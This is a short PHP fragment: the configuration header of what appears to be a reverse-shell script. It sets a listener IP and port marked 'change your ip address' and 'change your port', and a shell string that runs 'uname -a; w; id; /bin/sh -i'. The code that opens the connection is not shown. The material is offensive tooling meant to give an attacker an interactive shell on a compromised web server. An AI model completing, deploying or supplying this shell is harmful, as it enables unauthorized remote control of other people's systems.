<?php 
    set_time_limit(0);
    $VERSION = "1.0";
    $IP = '127.0.0.1';        #change your ip address
    $Post = 1234;             #change your port 
    $chunk_size=1400;
    $write_a = null;
    $error_a = null;
    $shell = 'uname -a; w; id; /bin/sh -i';
    $daemon =0;
    $debug = 0;
?>
